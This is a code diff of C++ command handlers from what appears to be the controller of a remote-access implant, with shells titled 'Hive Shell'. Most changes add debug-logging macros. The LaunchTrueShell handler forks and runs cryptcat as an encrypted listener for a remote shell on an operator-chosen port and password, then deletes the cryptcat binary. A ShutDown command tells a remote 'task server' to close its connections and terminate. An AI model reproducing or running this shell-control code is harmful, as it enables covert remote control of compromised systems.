@@ -45,6 +45,7 @@ void Command::Execute( Primitive::Activation& actvn, ProcessCmdAccumulator& , Pr
 	String			args = *argPtr++;
 	string			command = args;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
 	memset( &rbuf, 0, sizeof( REPLY ) );
 
@@ -80,6 +81,7 @@ void Command::Session( Primitive::Activation& actvn, ProcessCmdAccumulator&, Pro
 	String			args = *argPtr++;
 	string			command = args;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
 	memset( &rbuf, 0, sizeof( REPLY ) );
 
@@ -116,6 +118,7 @@ void Command::Exit( Primitive::Activation&, ProcessCmdAccumulator&, ProcessCmdRe
 	struct send_buf	sbuf;
 	REPLY			rbuf;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
 	memset( &rbuf, 0, sizeof( REPLY ) );
 
@@ -153,6 +156,7 @@ Command::ShutDown::ShutDown() {
 
 //	cout << "Creating ShutDownCmd Object" << endl;
 
+	DL(6);
 	referenceID = 33;
 	setTitle("now");
 	helpText = "Task server to close open files, network connections, and terminate. Does not effect execution upon reboot.";
@@ -174,6 +178,7 @@ ProcessCmdResponse Command::ShutDown::Process(binary&)
 	struct send_buf		sbuf;
 	REPLY				rbuf;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
 	memset( &rbuf, 0, sizeof( REPLY ) );
 
@@ -211,6 +216,7 @@ Command::LaunchTrueShell::LaunchTrueShell() {
 
 //	cout << "Creating ShutDownCmd Object" << endl;
 
+	DL(6);
 	referenceID = 34;
 	setTitle("open");
 	helpText = "Initiate shell connection with remote host.";
@@ -257,6 +263,7 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 	// Will we ever be on other Linux boxes without gnome? 
 	char gnomeTerminalCommand[255];
 
+	DL(6);
 	const ShellArgs &args = *(ShellArgs*)arguments.data;
 	printf( " . ip_len %i, ip %s\n", args.ip_len, args.ip_str );
 
@@ -299,6 +306,7 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 	{
 		int forkret;
 
+		DLX(6, printf("Launching Shell...\n"));
 		resp.type = ProcessCmdResponse::TYPE_Success;
 	   //Original code
 		//system( "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p 4321" );
@@ -309,11 +317,14 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 		//	snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
 
 		memset( gnomeTerminalCommand, 0, 255);    //Clear it out before we use it...
-		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
-
+		snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+//		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+		DLX(6, printf("Forking...\n"));
 		forkret = fork();
 		if (forkret == 0) {
+			DLX(6, printf("Child process executing shell command (\"%s\")...\n", gnomeTerminalCommand));
 			system( gnomeTerminalCommand );
+			DLX(6, printf("Shell terminated, associated child exiting in 5 seconds\n"));
 			sleep( 5 );
 			unlink( cryptcat_path );
 			exit(0);
@@ -322,6 +333,7 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 		// sleep added to avoid race condition where unlink() removes the file
 		// before system()->gnome-terminal() can execute it.
 		// yes, we know this is not the best way...
+		DLX(6, printf("Parent sleeping 5 seconds...\n"));
 		sleep( 5 );
 		// no checking return value because if unlink() fails, we won't do anything about it anyway
 		unlink( cryptcat_path );
